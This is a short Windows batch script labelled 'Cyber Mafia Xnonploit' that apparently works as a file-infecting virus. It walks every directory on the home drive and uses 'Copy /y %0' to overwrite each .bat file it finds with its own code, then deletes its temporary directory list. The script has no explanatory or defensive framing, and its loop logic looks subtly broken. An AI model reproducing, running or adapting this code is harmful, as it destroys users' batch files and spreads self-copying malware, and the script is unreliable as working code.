:::::::::::::::::::::::::
::Cyber Mafia Xnonploit::
:::::::::::::::::::::::::
@echo off
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.bat) Do (
            Set BatInfect=%%Z > Nul
            Copy /y %0 %BatInfect%
        )
    )

Del /f /s /q DirPath
